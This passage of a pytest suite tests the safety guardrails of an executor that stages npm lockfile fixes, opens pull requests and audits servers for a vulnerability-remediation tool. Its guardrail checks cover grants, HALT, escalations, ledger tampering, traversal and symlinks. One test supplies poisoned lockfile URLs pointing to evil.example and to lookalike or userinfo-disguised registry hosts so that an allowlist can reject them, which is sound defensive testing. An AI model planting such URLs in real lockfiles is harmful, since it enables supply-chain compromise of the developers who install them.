        _sh(repo, "add", "-A")
        _sh(repo, "commit", "-q", "-m", "lock")
        _sh(repo, "push", "-q", "origin", "main")
    _install(env, ops=["stage-fix"], hosts=[])

    def lock_fix(root: Path, **kw: object) -> fix.FixResult:
        (root / "package-lock.json").write_text(new)
        return fix.FixResult(npm=[(".", "fixed")], applied=True)

    monkeypatch.setattr(fix, "fix_path", lock_fix)
    rid = "f" * 32
    res = executor.act("stage-fix", str(repo), env["cfg"], request_id=rid)
    assert res["status"] == "failed" and "package-lock.json" in res["detail"], res
    _assert_refused_cleanly(repo, rid)


@pytest.mark.skipif(not GIT, reason="git not available")
def test_d3_malformed_lockfile_through_the_spool_moves_the_request(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "server-audit"])

    def lock_fix(root: Path, **kw: object) -> fix.FixResult:
        (root / "package-lock.json").write_text('{"packages": []}')
        return fix.FixResult(applied=True)

    monkeypatch.setattr(fix, "fix_path", lock_fix)
    rid = "9" * 32
    _req(env, rid, op="stage-fix", target=str(repo))
    out = executor.serve_requests(env["cfg"])
    assert [r["status"] for r in out] == ["failed"]
    assert not (executor.spool_dir() / "requests" / f"{rid}.json").exists()
    assert (executor.spool_dir() / "processed" / f"{rid}.json").exists()
    assert (executor.spool_dir() / "results" / f"{rid}.json").exists()

    def broken(op: str, host: str) -> dict:          # defence in depth: a programming error in an op
        raise AttributeError("'list' object has no attribute 'get'")
    monkeypatch.setattr(executor, "server_op", broken)
    res = executor.act("server-audit", "web1", env["cfg"], request_id="8" * 32)
    assert res["status"] == "failed" and "AttributeError" in res["detail"]
    assert [r["kind"] for r in ledger.read() if r.get("request_id") == "8" * 32] == ["begun", "failed"]


@pytest.mark.skipif(not GIT, reason="git not available")
def test_d4_open_pr_retry_after_pr_create_failed_is_idempotent(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[])
    monkeypatch.setattr(fix, "fix_path", _pin_fix)
    staged = executor.act("stage-fix", str(repo), env["cfg"])
    bindir = _fake_gh(env, monkeypatch)
    (bindir / "fail").write_text("")
    first = executor.act("open-pr", str(repo), env["cfg"])
    assert first["status"] == "failed" and "gh pr create failed" in first["detail"]
    remote = env["tmp"] / "remote.git"
    pushed = _sh(remote, "rev-parse", f"refs/heads/{staged['branch']}").strip()   # the push itself went through
    (bindir / "fail").unlink()
    second = executor.act("open-pr", str(repo), env["cfg"])
    assert second["status"] == "done" and second["pr"].endswith("/pull/9"), second
    calls = _gh_calls(bindir)
    assert calls[-2].startswith(f"pr list --repo github.com/o/svc --head {staged['branch']} ")
    assert calls[-1].startswith("pr create --repo github.com/o/svc ")
    assert _sh(remote, "rev-parse", f"refs/heads/{staged['branch']}").strip() == pushed
    assert not Path(staged["worktree"]).exists() and _executor_worktrees(repo) == []    # (c)
    assert staged["branch"] in _sh(repo, "branch", "--list", "vulnscan/*")             # the branch is kept


@pytest.mark.skipif(not GIT, reason="git not available")
def test_d4_restaging_the_same_fix_and_an_already_open_pr(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[], max_uses=20)
    monkeypatch.setattr(fix, "fix_path", _pin_fix)
    first = executor.act("stage-fix", str(repo), env["cfg"])
    second = executor.act("stage-fix", str(repo), env["cfg"])
    assert second["status"] == "done", second
    assert second["branch"] == first["branch"] and not Path(first["worktree"]).exists()
    assert _executor_worktrees(repo) == [str(Path(second["worktree"]).resolve())]
    bindir = _fake_gh(env, monkeypatch)
    assert executor.act("open-pr", str(repo), env["cfg"])["status"] == "done"
    pushed = _sh(env["tmp"] / "remote.git", "rev-parse", f"refs/heads/{first['branch']}").strip()
    third = executor.act("stage-fix", str(repo), env["cfg"])          # branch exists, checked out nowhere
    assert third["status"] == "done" and third["branch"] == first["branch"], third
    (bindir / "open.json").write_text(json.dumps([       # a fork's PR with the same branch name is not ours
        {"url": "https://github.example.com/o/svc/pull/8", "isCrossRepository": True},
        {"url": "https://github.example.com/o/svc/pull/9", "isCrossRepository": False}]))
    n = len(_gh_calls(bindir))
    again = executor.act("open-pr", str(repo), env["cfg"])
    assert again["status"] == "done" and again["pr"].endswith("/pull/9") and again.get("existing") is True
    assert not any(c.startswith("pr create") for c in _gh_calls(bindir)[n:])
    assert _executor_worktrees(repo) == []
    executor.act("stage-fix", str(repo), env["cfg"])
    (bindir / "open.json").write_text("[]")                          # remote ref is not this commit, no PR
    res = executor.act("open-pr", str(repo), env["cfg"])
    assert res["status"] == "failed" and "not overwriting" in res["detail"], res
    assert _sh(env["tmp"] / "remote.git", "rev-parse", f"refs/heads/{first['branch']}").strip() == pushed


@pytest.mark.skipif(not GIT, reason="git not available")
def test_d4_restaging_never_touches_refs_or_worktrees_it_did_not_create(env: dict,
                                                                       monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix"], hosts=[], max_uses=20)
    monkeypatch.setattr(fix, "fix_path", _pin_fix)
    first = executor.act("stage-fix", str(repo), env["cfg"])
    branch = first["branch"]
    _sh(repo, "worktree", "remove", "--force", first["worktree"])
    _sh(repo, "branch", "-D", branch)
    _sh(repo, "branch", branch, "main")                                # a person's branch under the same name
    res = executor.act("stage-fix", str(repo), env["cfg"])
    assert res["status"] == "failed" and "not created by the executor" in res["detail"], res
    assert _sh(repo, "rev-parse", branch) == _sh(repo, "rev-parse", "main")
    _sh(repo, "branch", "-D", branch)
    executor.act("stage-fix", str(repo), env["cfg"])
    mine = env["tmp"] / "my-checkout"
    wts = _executor_worktrees(repo)
    _sh(repo, "worktree", "remove", "--force", wts[0])
    _sh(repo, "worktree", "add", "-q", str(mine), branch)             # checked out outside the executor's dir
    res = executor.act("stage-fix", str(repo), env["cfg"])
    assert res["status"] == "failed" and "outside the executor" in res["detail"], res
    assert mine.is_dir() and _executor_worktrees(repo) == []


@pytest.mark.skipif(not GIT, reason="git not available")
def test_d4_a_timeout_during_stage_fix_removes_the_worktree(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix"], hosts=[])

    def slow(root: Path, **kw: object) -> fix.FixResult:
        raise subprocess.TimeoutExpired("npm", 600)

    monkeypatch.setattr(fix, "fix_path", slow)
    res = executor.act("stage-fix", str(repo), env["cfg"], request_id="3" * 32)
    assert res["status"] == "failed" and "timed out" in res["detail"]
    _assert_refused_cleanly(repo, "3" * 32)
    assert not [p for p in (env["tmp"] / "state" / "worktrees").iterdir() if p.is_dir()]


@pytest.mark.skipif(not GIT, reason="git not available")
def test_i4_authorize_refusal_order_and_no_begun_row(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import escalations, notify
    monkeypatch.setattr(notify, "send", lambda *a, **k: True)
    team = _git_repo(env["tmp"] / "repos" / "team")
    other = _git_repo(env["tmp"] / "repos" / "other")
    cfg = {**env["cfg"], "agent": {"team_dir": str(team)}}
    esc = executor.act("escalate", str(team), cfg, payload={"kind": "other", "evidence": "odd"}, run_id="r1")
    with (env["gov"] / "references" / "security-decisions.log.csv").open("a") as fh:
        fh.write("2026-10-22,vulnscan,s1,vulnscan-remediation,HALT,,,stop,security\n")
    # all of: broken ledger, open escalation, protected repo, no grant, HALT
    p = ledger.ledger_path()
    saved = p.read_text()
    rows = saved.splitlines()
    forged = json.loads(rows[-1])
    forged["detail"] = "forged"
    p.write_text("\n".join(rows[:-1] + [json.dumps(forged)]) + "\n")
    assert "integrity" in executor.act("stage-fix", str(team), cfg)["detail"]
    p.write_text(saved)
    res = executor.act("stage-fix", str(team), cfg)                  # no covering grant beats all: no git runs
    assert res["status"] == "refused" and "outside every active grant" in res["detail"], res
    _install(env, ops=["stage-fix"], hosts=[])
    res = executor.act("stage-fix", str(team), cfg)                  # escalation beats protected/HALT
    assert res["status"] == "refused" and esc["escalation"] in res["detail"], res
    escalations.resolve_other(esc["escalation"], "checked")
    res = executor.act("stage-fix", str(team), cfg)                  # protected beats HALT
    assert res["status"] == "refused" and "same repository" in res["detail"], res
    res = executor.act("stage-fix", str(other), cfg)
    assert res["status"] == "refused" and "HALT" in res["detail"], res
    assert _no_begun(ledger.read())


def _ssh_recorder(env: dict, monkeypatch: pytest.MonkeyPatch) -> Path:
    calls = env["tmp"] / "ssh-calls"
    calls.mkdir()
    bindir = env["tmp"] / "sshbin"
    bindir.mkdir()
    (bindir / "ssh").write_text(f'#!/bin/sh\nd="{calls}"\nn=$(ls "$d" | wc -l | tr -d " ")\n'
                                'for a in "$@"; do printf "%s\\n" "$a"; done > "$d/$n.argv"\n'
                                'cat > "$d/$n.payload"\necho "RESULT clean"\n')
    (bindir / "ssh").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    return calls


@pytest.mark.skipif(not shutil.which("bash"), reason="bash not available")
def test_i6_server_op_success_path_with_a_fake_ssh(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    kit = env["tmp"] / "kit"
    kit.mkdir()
    (kit / "hosts.conf").write_text("web1 | deploy@web1.example.com\n")
    (kit / "remote.sh").write_text("#!/bin/sh\necho planted\necho 'RESULT clean'\n")   # never run
    (kit / "run-host.sh").write_text("#!/bin/sh\necho planted\necho 'RESULT clean'\n")
    calls = _ssh_recorder(env, monkeypatch)
    _install(env, ops=["server-audit", "server-dryrun"])
    real_run, argvs = subprocess.run, []
    monkeypatch.setattr(executor.subprocess, "run", lambda argv, **k: argvs.append(argv) or real_run(argv, **k))
    audit = executor.act("server-audit", "web1", env["cfg"])
    assert audit["status"] == "done" and audit["findings"] == 0, audit
    assert argvs[-1] == ["bash", str(executor.kit_dir() / "remote.sh"), "web1", "L1-audit.sh"]
    log = Path(audit["log"])
    assert log.parent == env["tmp"] / "state" / "server-logs" and "RESULT clean" in log.read_text()
    assert "planted" not in log.read_text() and Path(audit["report"]).is_file()
    for f in calls.iterdir():
        f.unlink()
    dry = executor.act("server-dryrun", "web1", env["cfg"])
    assert dry["status"] == "done", dry
    assert argvs[-1] == ["bash", str(executor.kit_dir() / "run-host.sh"), "web1"]
    assert "DRY RUN complete" in Path(dry["log"]).read_text()
    kit_scripts = {f.name: f.read_text() for f in executor.kit_dir().glob("L*.sh")}
    ran = []
    for argv_file in sorted(calls.glob("*.argv")):
        argv = argv_file.read_text().splitlines()
        assert "deploy@web1.example.com" in argv
        assert "BatchMode=yes" in argv and argv[argv.index("BatchMode=yes") - 1] == "-o"   # V36: never prompts
        remote_cmd = argv[-1]
        assert "--apply" not in remote_cmd and "--reboot" not in remote_cmd, remote_cmd
        payload = argv_file.with_suffix(".payload").read_text()
        ran += [name for name, text in kit_scripts.items() if payload.endswith(text)]
    assert sorted(ran) == ["L1-audit.sh", "L2-os-patch.sh", "L3-node-runtime.sh", "L5-containers.sh"]
    assert [r["kind"] for r in ledger.read()].count("done") == 2


@pytest.mark.skipif(not GIT, reason="git not available")
def test_a3_stage_fix_refuses_traversal_and_symlinked_targets(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    tmp = env["tmp"]
    team = _git_repo(tmp / "repos" / "team")
    svc = _git_repo(tmp / "repos" / "svc")
    outside = _git_repo(tmp / "outside")
    (tmp / "repos" / "team-link").symlink_to(team)
    (tmp / "repos" / "out-link").symlink_to(outside)
    cfg = {**env["cfg"], "agent": {"team_dir": str(team)}}
    _install(env, ops=["stage-fix", "open-pr"], hosts=[])
    called: list[Path] = []
    monkeypatch.setattr(fix, "fix_path", lambda root, **kw: called.append(root) or fix.FixResult())
    for target in (f"{svc}/../team", str(tmp / "repos" / "team-link"), f"{tmp}/repos/./team/"):
        for op in ("stage-fix", "open-pr"):
            res = executor.act(op, target, cfg)
            assert res["status"] == "refused" and "same repository" in res["detail"], (target, res)
    for target in (f"{svc}/../../outside", str(tmp / "repos" / "out-link")):
        res = executor.act("stage-fix", target, cfg)
        assert res["status"] == "refused" and "not authorized" in res["detail"], (target, res)
    assert "absolute" in executor.act("stage-fix", "repos/svc", cfg)["detail"]
    assert not called and _no_begun(ledger.read())


@pytest.mark.parametrize("url", ["https://evil.example/x.tgz", "https://registry.npmjs.org@evil.example/x.tgz",
                                 "https://registry.npmjs.org.evil.example/x.tgz", "http://registry.npmjs.org/a.tgz",
                                 "git+ssh://git@evil.example/a.git", "file:../evil.tgz"])
@pytest.mark.parametrize("section", ["packages", "dependencies", "nested"])
def test_a4_lockfile_resolved_outside_the_registry_is_refused(env: dict, tmp_path: Path, url: str,
                                                              section: str) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = _git_repo(tmp_path / "r")
    base = _sh(repo, "rev-parse", "HEAD").strip()
    ok = "https://registry.npmjs.org/a/-/a-1.0.1.tgz"
    if section == "packages":
        lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.1", "resolved": url}}}
    elif section == "dependencies":                        # lockfile v1 (npm 6) has no `packages`
        lock = {"lockfileVersion": 1, "dependencies": {"a": {"version": "1.0.1", "resolved": url}}}
    else:
        lock = {"lockfileVersion": 1, "dependencies": {"a": {"version": "1.0.1", "resolved": ok, "dependencies": {
            "b": {"version": "2.0.0", "resolved": url}}}}}
    (repo / "package-lock.json").write_text(json.dumps(lock))
    with pytest.raises(executor.ExecError, match="registry allowlist"):
        executor.validate_diff(repo, base)


@pytest.mark.skipif(not GIT, reason="git not available")
def test_c13_an_open_pr_whose_branch_holds_other_content_is_not_claimed(env: dict,
                                                                         monkeypatch: pytest.MonkeyPatch) -> None:
    """Someone else's commit on the vulnscan branch: the executor refuses to report that PR as its fix."""
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[], max_uses=20)
    monkeypatch.setattr(fix, "fix_path", _pin_fix)
    staged = executor.act("stage-fix", str(repo), env["cfg"])
    bindir = _fake_gh(env, monkeypatch)
    (bindir / "fail").write_text("")
    assert executor.act("open-pr", str(repo), env["cfg"])["status"] == "failed"   # pushed, no PR yet
    other = env["tmp"] / "other"
    subprocess.run(["git", "clone", "-q", "-b", staged["branch"], str(env["tmp"] / "remote.git"), str(other)],
                   check=True, capture_output=True)
    (other / "app.py").write_text("print('not the fix')\n")
    _sh(other, "-c", "user.email=x@example.com", "-c", "user.name=x", "commit", "-qam", "other change")
    _sh(other, "push", "-q", "origin", staged["branch"])
    (bindir / "fail").unlink()
    (bindir / "open.json").write_text(json.dumps([{"url": "https://github.example.com/o/svc/pull/9",
                                                   "isCrossRepository": False}]))
    res = executor.act("open-pr", str(repo), env["cfg"])
    assert res["status"] == "failed" and "not claiming" in res["detail"], res
    assert Path(staged["worktree"]).exists()                         # nothing cleaned up on a refusal


@pytest.mark.skipif(os.geteuid() == 0, reason="root reads mode-000 files")
def test_an_unreadable_grant_file_refuses_repo_ops(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    """An unreadable grant file might name a protected repository: stage-fix refuses instead of skipping it."""
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[])
    monkeypatch.setattr(fix, "fix_path", _pin_fix)
    f = grant.grants_dir() / "zz-unreadable.json"
    f.write_text("{}")
    os.chmod(f, 0)
    try:
        res = executor.act("stage-fix", str(repo), env["cfg"])
    finally:
        os.chmod(f, 0o600)
    assert res["status"] == "refused" and "cannot tell which repositories are protected" in res["detail"], res
